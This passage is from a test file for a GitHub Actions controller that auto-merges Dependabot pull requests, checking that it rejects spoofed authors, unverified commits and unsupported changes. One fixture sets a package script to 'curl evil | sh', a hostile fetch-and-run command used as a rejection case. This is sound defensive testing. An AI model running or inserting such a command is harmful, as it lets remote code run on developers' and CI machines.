			scenario: { pr, openPrs: [pr], fileContents: defaultFiles() },
			enabled: false,
		});
		assert.equal(result.result, 'skip', result.reason);
		assert.equal(writes.length, 0);
	});
}

for (const [name, user] of Object.entries({
	'ioBroker-Bot user type User': { login: 'ioBroker-Bot', id: 156702024, type: 'User' },
	'spoofed login with wrong id': { login: 'dependabot[bot]', id: 1, type: 'Bot' },
	'spoofed login with wrong type': { login: 'dependabot[bot]', id: 49699333, type: 'User' },
	'dependabot-like branch name but foreign author': { login: 'attacker', id: 2, type: 'User' },
})) {
	test(`skip: ${name}`, async () => {
		const pr = makePr({ user });
		const { result, writes } = await runScenario({
			scenario: { pr, openPrs: [pr], fileContents: defaultFiles() },
			enabled: false,
		});
		assert.equal(result.result, 'skip', result.reason);
		assert.equal(writes.length, 0);
	});
}

test('skip: PR with foreign base branch or repo', async () => {
	for (const base of [
		{ ref: 'develop', sha: BASE, repo: { id: REPO_ID } },
		{ ref: 'main', sha: BASE, repo: { id: 4711 } },
	]) {
		const pr = makePr({ base });
		const { result, writes } = await runScenario({
			scenario: { pr, openPrs: [pr], fileContents: defaultFiles() },
			enabled: false,
		});
		assert.equal(result.result, 'skip', result.reason);
		assert.equal(writes.length, 0);
	}
});

for (const [name, commitOverrides] of Object.entries({
	'commit by another author': { author: { id: 1, login: 'attacker', type: 'User' } },
	'commit with null author': { author: null },
	'unverified commit': { commit: { verification: { verified: false } } },
	'commit without verification': { commit: { verification: null } },
	'commit by maintainer with valid signature': {
		author: { id: 156702024, login: 'Percy2Live', type: 'User' },
		commit: { verification: { verified: true } },
	},
})) {
	test(`skip: ${name}`, async () => {
		const { result, writes } = await runScenario({
			scenario: { commits: [makeCommit(commitOverrides)], fileContents: defaultFiles() },
			enabled: false,
		});
		assert.equal(result.result, 'skip', result.reason);
		assert.equal(writes.length, 0);
	});
}

test('skip: one foreign commit among dependabot commits', async () => {
	const { result, writes } = await runScenario({
		scenario: {
			commits: [
				makeCommit(),
				makeCommit({
					author: { id: 5, login: 'someone', type: 'User' },
					commit: { verification: { verified: true } },
				}),
			],
			fileContents: defaultFiles(),
		},
		enabled: false,
	});
	assert.equal(result.result, 'skip');
	assert.equal(writes.length, 0);
});

test('skip: PR without commits', async () => {
	const { result } = await runScenario({ scenario: { commits: [], fileContents: defaultFiles() }, enabled: false });
	assert.equal(result.result, 'skip');
});

/* ---------------------------------------------------------------------- */
/* Orchestration: file and dependency policy                               */
/* ---------------------------------------------------------------------- */

for (const [name, extraScenario] of Object.entries({
	'workflow file touched': {
		files: [...FILES, { filename: '.github/workflows/test-and-release.yml', status: 'modified' }],
		pr: makePr({ changed_files: 3 }),
	},
	'added source file': {
		files: [...FILES, { filename: 'src/main.ts', status: 'added' }],
		pr: makePr({ changed_files: 3 }),
	},
	'renamed file': {
		files: [
			{ filename: 'package.json', status: 'modified' },
			{ filename: 'package-lock.json', status: 'renamed' },
		],
	},
	'lockfile-only update': {
		files: [{ filename: 'package-lock.json', status: 'modified' }],
		pr: makePr({ changed_files: 1 }),
	},
	'file count drift': { files: FILES, pr: makePr({ changed_files: 5 }) },
})) {
	test(`unsupported-policy: ${name}`, async () => {
		const { result, writes } = await runScenario({
			scenario: { fileContents: defaultFiles(), ...extraScenario },
			enabled: false,
		});
		assert.equal(result.result, 'unsupported-policy', result.reason);
		assert.equal(writes.length, 0);
	});
}

for (const [name, headManifest] of Object.entries({
	'production minor bump': { ...HEAD_MANIFEST, dependencies: { '@iobroker/adapter-core': '^3.5.0' } },
	'production major bump': { ...HEAD_MANIFEST, dependencies: { '@iobroker/adapter-core': '^4.0.0' } },
	'development major bump': {
		...HEAD_MANIFEST,
		devDependencies: { ...HEAD_MANIFEST.devDependencies, '@types/node': '^23.0.0' },
	},
	'prerelease version': {
		...HEAD_MANIFEST,
		devDependencies: { ...HEAD_MANIFEST.devDependencies, '@types/node': '^22.20.6-beta.1' },
	},
	'version downgrade': {
		...HEAD_MANIFEST,
		devDependencies: { ...HEAD_MANIFEST.devDependencies, '@types/node': '^22.20.4' },
	},
	'range operator change': {
		...HEAD_MANIFEST,
		devDependencies: { ...HEAD_MANIFEST.devDependencies, '@types/node': '~22.20.6' },
	},
	'new dependency added': {
		...HEAD_MANIFEST,
		devDependencies: { ...HEAD_MANIFEST.devDependencies, 'left-pad': '^1.0.0' },
	},
	'dependency removed': { ...HEAD_MANIFEST, devDependencies: { '@types/node': '^22.20.6' } },
	'manifest script change': { ...HEAD_MANIFEST, scripts: { test: 'curl evil | sh' } },
	'manifest version change': { ...HEAD_MANIFEST, version: '1.0.3' },
})) {
	test(`unsupported-policy: ${name}`, async () => {
		const files = defaultFiles();
		files[`package.json@${HEAD}`] = headManifest;
		const { result, writes } = await runScenario({ scenario: { fileContents: files }, enabled: false });
		assert.equal(result.result, 'unsupported-policy', result.reason);
		assert.equal(writes.length, 0);
	});
}

test('unsupported-policy: changed alias dependency', async () => {
	const files = defaultFiles();
	const head = JSON.parse(JSON.stringify(HEAD_MANIFEST));
	head.devDependencies['@types/iobroker'] = 'npm:@iobroker/types@^7.3.0';
	files[`package.json@${HEAD}`] = head;
	const { result, writes } = await runScenario({ scenario: { fileContents: files }, enabled: false });
	assert.equal(result.result, 'unsupported-policy', result.reason);
	assert.equal(writes.length, 0);
});

test('unsupported-policy: invalid lockfile JSON', async () => {
	const files = defaultFiles();
	files[`package-lock.json@${HEAD}`] = { raw: '{ this is not json' };
	const { result, writes } = await runScenario({ scenario: { fileContents: files }, enabled: false });
	assert.equal(result.result, 'unsupported-policy', result.reason);
	assert.equal(writes.length, 0);
});

test('unsupported-policy: lockfile above the size limit', async () => {
	const files = defaultFiles();
	files[`package-lock.json@${HEAD}`] = { raw: JSON.stringify(LOCKFILE), size: 1024 * 1024 + 1 };
	const { result, writes } = await runScenario({ scenario: { fileContents: files }, enabled: false });
	assert.equal(result.result, 'unsupported-policy', result.reason);
	assert.equal(writes.length, 0);
});

test('unsupported-policy: lockfile with unsupported lockfileVersion', async () => {
	const files = defaultFiles();
	files[`package-lock.json@${HEAD}`] = { ...LOCKFILE, lockfileVersion: 1 };
	const { result } = await runScenario({ scenario: { fileContents: files }, enabled: false });
	assert.equal(result.result, 'unsupported-policy', result.reason);
});

test('unsupported-policy: github-actions style update (file list policy)', async () => {
	const { result, writes } = await runScenario({
		scenario: {
			fileContents: defaultFiles(),
			files: [
				{ filename: '.github/workflows/automerge-dependabot.yml', status: 'modified' },
				{ filename: 'package.json', status: 'modified' },
				{ filename: 'package-lock.json', status: 'modified' },
			],
			pr: makePr({ changed_files: 3 }),
		},
		enabled: false,
	});
	assert.equal(result.result, 'unsupported-policy', result.reason);
	assert.equal(writes.length, 0);
});

/* ---------------------------------------------------------------------- */
/* Orchestration: check gates                                               */
/* ---------------------------------------------------------------------- */

test('skip: required job missing from run attempt', async () => {
	const { result, writes } = await runScenario({
		scenario: { jobs: JOBS.filter(job => !job.name.startsWith('adapter-tests (24')), fileContents: defaultFiles() },
		enabled: false,
	});
	assert.equal(result.result, 'skip', result.reason);
	assert.equal(writes.length, 0);
});

test('skip: current head check-runs missing', async () => {
	const { result, writes } = await runScenario({
		scenario: { checkRuns: makeCheckRuns().slice(1), fileContents: defaultFiles() },
		enabled: false,
	});
	assert.equal(result.result, 'skip', result.reason);
	assert.equal(writes.length, 0);
});

test('skip: current head check-run failed', async () => {
	const { result, writes } = await runScenario({
		scenario: {
			checkRuns: makeCheckRuns({ 'check-and-lint': { conclusion: 'failure' } }),
			fileContents: defaultFiles(),
		},
		enabled: false,
	});
	assert.equal(result.result, 'skip', result.reason);
	assert.equal(writes.length, 0);
});

test('skip: current head check-run pending', async () => {
	const { result, writes } = await runScenario({
		scenario: {
			checkRuns: makeCheckRuns({
				'adapter-tests (22.x, ubuntu-latest)': { status: 'in_progress', conclusion: null },
			}),
			fileContents: defaultFiles(),
		},
		enabled: false,
	});
	assert.equal(result.result, 'skip', result.reason);
	assert.equal(writes.length, 0);
});

test('skip: head check-runs belong to a different check suite', async () => {
	const { result, writes } = await runScenario({
		scenario: {
			checkRuns: makeCheckRuns().map(run => ({ ...run, check_suite: { id: 4711 } })),
			fileContents: defaultFiles(),
		},
		enabled: false,
	});
	assert.equal(result.result, 'skip', result.reason);
	assert.equal(writes.length, 0);
});

/* ---------------------------------------------------------------------- */
/* Orchestration: pre-mutation drift and configuration errors              */
/* ---------------------------------------------------------------------- */

test('skip: head drifts between validation and mutation', async () => {
	const { result, writes } = await runScenario({
		scenario: {
			fileContents: defaultFiles(),
			pr: count => (count === 0 ? makePr() : makePr({ head: { sha: OTHER_SHA, repo: { id: REPO_ID } } })),
		},
		enabled: true,
	});
	assert.equal(result.result, 'skip', result.reason);
	assert.match(result.reason, /head drifted/);
	assert.equal(writes.length, 0);
});

test('skip: base pointer drifts between validation and mutation', async () => {
	const { result, writes } = await runScenario({
		scenario: {
			fileContents: defaultFiles(),
			pr: count =>
				count === 0 ? makePr() : makePr({ base: { ref: 'main', sha: OTHER_SHA, repo: { id: REPO_ID } } }),
		},
		enabled: true,
	});
	assert.equal(result.result, 'skip', result.reason);
	assert.match(result.reason, /base drifted/);
	assert.equal(writes.length, 0);
});

test('skip: base branch moves between validation and mutation', async () => {
	const { result, writes } = await runScenario({
		scenario: {
			fileContents: defaultFiles(),
			mainRef: count => ({ object: { sha: count === 0 ? MAIN : OTHER_SHA } }),
		},
		enabled: true,
	});
	assert.equal(result.result, 'skip', result.reason);
	assert.match(result.reason, /base branch moved/);
	assert.equal(writes.length, 0);
});

test('error: missing configuration file fails closed', async () => {
	const { result, writes, core } = await runScenario({
		configPath: path.join(os.tmpdir(), `does-not-exist-${Math.random().toString(36).slice(2)}.json`),
		scenario: { fileContents: defaultFiles() },
	});
	assert.equal(result.result, 'error');
	assert.equal(core.__failures.length, 1);
	assert.equal(writes.length, 0);
});

test('error: invalid configuration schema fails closed', async () => {
	const { result, writes, core } = await runScenario({
		configTemplate: { ...CONFIG_TEMPLATE, schemaVersion: 99 },
		scenario: { fileContents: defaultFiles() },
	});
	assert.equal(result.result, 'error');
	assert.equal(core.__failures.length, 1);
	assert.equal(writes.length, 0);
});

test('error: configuration with unknown fields fails closed', async () => {
	const { result, writes } = await runScenario({
		configTemplate: { ...CONFIG_TEMPLATE, minActors: ['dependabot[bot]'] },
		scenario: { fileContents: defaultFiles() },
	});
	assert.equal(result.result, 'error');
	assert.equal(writes.length, 0);
});

test('error: invalid JSON in configuration fails closed', async () => {
	const file = path.join(os.tmpdir(), `bad-json-${Math.random().toString(36).slice(2)}.json`);
	fs.writeFileSync(file, '{ nope');
	try {
		const { result, writes } = await runScenario({ configPath: file, scenario: { fileContents: defaultFiles() } });
		assert.equal(result.result, 'error');
		assert.equal(writes.length, 0);
	} finally {
		fs.rmSync(file, { force: true });
	}
});

/* ---------------------------------------------------------------------- */
/* Orchestration: real merge path with enabled=true                        */
/* ---------------------------------------------------------------------- */

test('merge: eligible PR is squash-merged with the exact validated SHA', async () => {
	const { result, writes } = await runScenario({
		scenario: { pr: openThenMergedPr(), fileContents: defaultFiles() },
		enabled: true,
	});
	assert.equal(result.result, 'merged', result.reason);
	assert.equal(writes.length, 1);
	assert.deepEqual(writes[0].params, {
		owner: 'Percy2Live',
		repo: 'ioBroker.bluetti',
		pull_number: 188,
		sha: HEAD,
		merge_method: 'squash',
	});
	assert.equal(result.audit.mergeCommitSha, MERGE_SHA);
});

test('merge: readback mismatch is an error', async () => {
	const { result, writes, core } = await runScenario({
		scenario: {
			pr: count =>
				count <= 1 ? makePr() : makePr({ state: 'closed', merged: true, merge_commit_sha: OTHER_SHA }),
			mergeResponse: { merged: true, sha: MERGE_SHA },
			fileContents: defaultFiles(),
		},
		enabled: true,
	});
	assert.equal(result.result, 'error', result.reason);
	assert.match(result.reason, /merge_commit_sha mismatch/);
	assert.equal(core.__failures.length, 1);
	assert.equal(writes.length, 1);
});

test('merge: PR not merged after successful response is an error', async () => {
	const { result, writes, core } = await runScenario({
		scenario: {
			pr: count => (count <= 1 ? makePr() : makePr({ merged: false })),
			mergeResponse: { merged: true, sha: MERGE_SHA },
			fileContents: defaultFiles(),
		},
		enabled: true,
	});
	assert.equal(result.result, 'error', result.reason);
	assert.equal(core.__failures.length, 1);
	assert.equal(writes.length, 1);
});

test('merge: response without merged=true is an error', async () => {
	const { result, writes } = await runScenario({
		scenario: {
			pr: openThenMergedPr(),
			mergeResponse: { merged: false, message: 'Pull request is not mergeable' },
			fileContents: defaultFiles(),
		},
		enabled: true,
	});
	assert.equal(result.result, 'error');
	assert.equal(writes.length, 1);
});

for (const status of [403, 405, 409, 422, 429]) {
	test(`merge: HTTP ${status} fails closed without alternative mutation`, async () => {
		const error = new Error(`fake merge failure ${status}`);
		error.status = status;
		const { result, writes, core } = await runScenario({
			scenario: { mergeResponse: error, pr: openThenMergedPr(), fileContents: defaultFiles() },
			enabled: true,
		});
		assert.equal(result.result, 'error');
		assert.equal(core.__failures.length, 1);
		assert.equal(writes.length, 1, 'exactly one sanctioned mutation attempt, no retries');
	});
}

test('merge: API timeout during validation fails closed with zero writes', async () => {
	const error = new Error('fake timeout');
	error.status = 408;
	const { result, writes } = await runScenario({
		scenario: { commits: error, fileContents: defaultFiles() },
		enabled: true,
	});
	assert.equal(result.result, 'error');
	assert.equal(writes.length, 0);
});

test('idempotency: second identical event finds the PR already merged', async () => {
	const mergedPr = makePr({ state: 'closed', merged: true, merge_commit_sha: MERGE_SHA });
	const { result, writes } = await runScenario({
		scenario: { pr: mergedPr, openPrs: [mergedPr], fileContents: defaultFiles() },
		enabled: true,
	});
	assert.equal(result.result, 'skip', result.reason);
	assert.match(result.reason, /already merged/);
	assert.equal(writes.length, 0);
});

/* ---------------------------------------------------------------------- */
/* Static analysis: controller source                                       */
/* ---------------------------------------------------------------------- */

test('controller source: no process execution, no eval, no dynamic imports', () => {
	const source = fs.readFileSync(path.join(REPO_ROOT, '.github', 'scripts', 'dependabot-automerge.cjs'), 'utf8');
	assert.equal(/child_process/.test(source), false);
	assert.equal(/\beval\s*\(/.test(source), false);
	assert.equal(/new\s+Function\s*\(/.test(source), false);
	assert.equal(/execSync|spawnSync/.test(source), false);
	const requires = [...source.matchAll(/require\((['"])(.*?)\1\)/g)].map(match => match[2]);
	assert.deepEqual([...new Set(requires)].sort(), ['node:fs', 'node:path']);
});

test('controller source: no PR metadata is interpolated into scripts or shells', () => {
	const source = fs.readFileSync(path.join(REPO_ROOT, '.github', 'scripts', 'dependabot-automerge.cjs'), 'utf8');
	assert.equal(source.includes('${{'), false);
});

/* ---------------------------------------------------------------------- */
/* Static analysis: workflow files                                          */
/* ---------------------------------------------------------------------- */

function readWorkflow(file) {
	return fs.readFileSync(path.join(REPO_ROOT, '.github', 'workflows', file), 'utf8');
}

test('automerge workflow: workflow_run only, no pull_request_target', () => {
	const yaml = readWorkflow('automerge-dependabot.yml');
	assert.equal(yaml.includes('pull_request_target'), false);
	assert.match(yaml, /workflow_run:/);
	assert.match(yaml, /workflows:\s*\[?['"]Test and Release['"]\]?/);
	assert.match(yaml, /types:\s*\[completed\]/);
	assert.match(yaml, /timeout-minutes:\s*5/);
	assert.match(yaml, /concurrency:/);
	assert.match(yaml, /automerge-dependabot-\$\{\{ github\.event\.workflow_run\.head_sha \}\}/);
	assert.match(yaml, /cancel-in-progress:\s*false/);
});

test('automerge workflow: least-privilege permissions', () => {
	const yaml = readWorkflow('automerge-dependabot.yml');
	assert.match(yaml, /^permissions:\s*\{\}/m);
	const jobBlock = yaml.slice(yaml.indexOf('permissions:\n      #'));
	assert.match(jobBlock, /contents:\s*write/);
	assert.match(jobBlock, /pull-requests:\s*write/);
	assert.match(jobBlock, /actions:\s*read/);
	assert.match(jobBlock, /checks:\s*read/);
	assert.equal(/id-token/.test(jobBlock), false);
	assert.equal(/issues:\s*write/.test(jobBlock), false);
	assert.equal(/packages|deployments/.test(jobBlock), false);
});

test('automerge workflow: trusted checkout at controller SHA with pinned actions', () => {
	const yaml = readWorkflow('automerge-dependabot.yml');
	assert.match(yaml, /repository:\s*Percy2Live\/ioBroker\.bluetti/);
	assert.match(yaml, /ref:\s*\$\{\{ github\.sha \}\}/);
	assert.equal(/workflow_run\.head_sha/.test(yaml.match(/ref:\s*(.*)/)[1]), false);
	assert.match(yaml, /persist-credentials:\s*false/);
	assert.match(yaml, /actions\/checkout@d23441a48e516b6c34aea4fa41551a30e30af803/);
	assert.match(yaml, /actions\/github-script@ed597411d8f924073f98dfc5c65a23a2325f34cd/);
});

test('automerge workflow: no GitHub expression interpolation inside the script', () => {
	const yaml = readWorkflow('automerge-dependabot.yml');
	const scriptStart = yaml.indexOf('script: |');
	assert.notEqual(scriptStart, -1);
	const scriptBlock = yaml.slice(scriptStart);
	assert.equal(scriptBlock.includes('${{'), false);
	assert.match(scriptBlock, /require\('\.\/\.github\/scripts\/dependabot-automerge\.cjs'\)/);
});

test('test-and-release workflow: read-only PR jobs, tag-only deploy, unchanged gates', () => {
	const yaml = readWorkflow('test-and-release.yml');
	assert.equal(yaml.includes('pull_request_target'), false);
	assert.match(yaml, /^permissions:\s*$/m);
	assert.match(yaml, /^\s+contents:\s*read$/m);
	assert.match(yaml, /pull_request:\s*\{\}/);
	assert.match(yaml, /group:\s*\$\{\{ github\.ref \}\}/);
	assert.match(yaml, /cancel-in-progress:\s*true/);
	assert.match(yaml, /node-version:\s*\[22\.x,\s*24\.x,\s*26\.x\]/);
	assert.match(yaml, /os:\s*\[ubuntu-latest,\s*windows-latest,\s*macos-latest\]/);
	assert.match(yaml, /check-and-lint:/);
	assert.match(yaml, /adapter-tests:/);
	assert.match(yaml, /deploy:/);
	assert.match(yaml, /startsWith\(github\.ref,\s*'refs\/tags\/v'\)/);
	assert.match(yaml, /github\.event_name\s*==\s*'push'/);
	const deployBlock = yaml.slice(yaml.indexOf('  deploy:'));
	assert.match(deployBlock, /id-token:\s*write/);
	assert.match(deployBlock, /contents:\s*write/);
});

test('repository files: incompatible auto-merge.yml is gone, JSON config shipped', () => {
	assert.equal(fs.existsSync(path.join(REPO_ROOT, '.github', 'auto-merge.yml')), false);
	assert.equal(fs.existsSync(path.join(REPO_ROOT, '.github', 'auto-merge.json')), true);
});

test('package.json: workflow tests are part of the mandatory test chain', () => {
	const pkg = JSON.parse(fs.readFileSync(path.join(REPO_ROOT, 'package.json'), 'utf8'));
	assert.equal(pkg.scripts['test:workflow'], 'node --test test/workflows/dependabot-automerge.test.cjs');
	assert.match(pkg.scripts.test, /test:ts && npm run test:package && npm run test:workflow/);
});
